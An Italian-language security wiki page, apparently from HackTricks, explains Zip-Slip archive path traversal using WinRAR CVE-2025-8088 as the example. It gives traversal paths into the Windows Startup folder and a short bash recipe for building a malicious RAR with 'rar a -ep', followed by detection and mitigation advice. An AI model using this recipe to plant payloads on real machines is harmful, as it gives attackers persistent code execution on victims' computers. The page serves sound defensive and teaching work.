# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Panoramica

Molti formati di archivio (ZIP, RAR, TAR, 7-ZIP, ecc.) consentono a ciascuna voce di portare il proprio **percorso interno**. Quando un'utilità di estrazione onora ciecamente quel percorso, un nome file creato contenente `..` o un **percorso assoluto** (ad es. `C:\Windows\System32\`) verrà scritto al di fuori della directory scelta dall'utente. Questa classe di vulnerabilità è ampiamente conosciuta come *Zip-Slip* o **traversata del percorso di estrazione dell'archivio**.

Le conseguenze variano dalla sovrascrittura di file arbitrari al raggiungimento diretto dell'**esecuzione remota di codice (RCE)** depositando un payload in una posizione **auto-eseguibile** come la cartella *Startup* di Windows.

## Causa principale

1. L'attaccante crea un archivio in cui uno o più header di file contengono:
* Sequenze di traversata relative (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Percorsi assoluti (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
2. La vittima estrae l'archivio con uno strumento vulnerabile che si fida del percorso incorporato invece di sanificarlo o forzare l'estrazione sotto la directory scelta.
3. Il file viene scritto nella posizione controllata dall'attaccante ed eseguito/caricato la prossima volta che il sistema o l'utente attiva quel percorso.

## Esempio reale – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR per Windows (inclusi il CLI `rar` / `unrar`, la DLL e la sorgente portatile) non è riuscito a convalidare i nomi dei file durante l'estrazione. Un archivio RAR malevolo contenente un'entrata come:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
finirebbe **fuori** dalla directory di output selezionata e all'interno della cartella *Startup* dell'utente. Dopo il login, Windows esegue automaticamente tutto ciò che è presente lì, fornendo RCE *persistente*.

### Creazione di un PoC Archive (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Opzioni utilizzate:
* `-ep`  – memorizza i percorsi dei file esattamente come forniti (non **potare** il `./` iniziale).

Consegnare `evil.rar` alla vittima e istruirla a estrarlo con una versione vulnerabile di WinRAR.

### Sfruttamento Osservato nel Mondo Reale

ESET ha segnalato campagne di spear-phishing RomCom (Storm-0978/UNC2596) che allegavano archivi RAR abusando di CVE-2025-8088 per distribuire backdoor personalizzate e facilitare operazioni di ransomware.

## Suggerimenti per la Rilevazione

* **Ispezione statica** – Elencare le voci dell'archivio e contrassegnare qualsiasi nome contenente `../`, `..\\`, *percorsi assoluti* (`C:`) o codifiche UTF-8/UTF-16 non canoniche.
* **Estrazione in sandbox** – Decomprimere in una directory usa e getta utilizzando un estrattore *sicuro* (ad es., `patool` di Python, 7-Zip ≥ ultima versione, `bsdtar`) e verificare che i percorsi risultanti rimangano all'interno della directory.
* **Monitoraggio degli endpoint** – Allertare su nuovi eseguibili scritti nelle posizioni `Startup`/`Run` poco dopo che un archivio è stato aperto da WinRAR/7-Zip/etc.

## Mitigazione e Indurimento

1. **Aggiornare l'estrattore** – WinRAR 7.13 implementa una corretta sanificazione dei percorsi. Gli utenti devono scaricarlo manualmente perché WinRAR non dispone di un meccanismo di aggiornamento automatico.
2. Estrarre archivi con l'opzione **“Ignora percorsi”** (WinRAR: *Estrai → "Non estrarre percorsi"*) quando possibile.
3. Aprire archivi non fidati **all'interno di una sandbox** o VM.
4. Implementare il whitelisting delle applicazioni e limitare l'accesso in scrittura degli utenti alle directory di auto-esecuzione.

## Casi Aggiuntivi / Storici Colpiti

* 2018 – Massiva avviso *Zip-Slip* da Snyk che colpisce molte librerie Java/Go/JS.
* 2023 – 7-Zip CVE-2023-4011 simile traversale durante la fusione `-ao`.
* Qualsiasi logica di estrazione personalizzata che non chiama `PathCanonicalize` / `realpath` prima della scrittura.

## Riferimenti

- [BleepingComputer – WinRAR zero-day sfruttato per piantare malware durante l'estrazione degli archivi](https://www.bleepingcomputer.com/news/security/winrar-zero-day-flaw-exploited-by-romcom-hackers-in-phishing-attacks/)
- [WinRAR 7.13 Changelog](https://www.win-rar.com/singlenewsview.html?&L=0&tx_ttnews%5Btt_news%5D=283&cHash=a64b4a8f662d3639dec8d65f47bc93c5)
- [Snyk – Scrittura sulla vulnerabilità Zip Slip](https://snyk.io/research/zip-slip-vulnerability)

{{#include ../banners/hacktricks-training.md}}
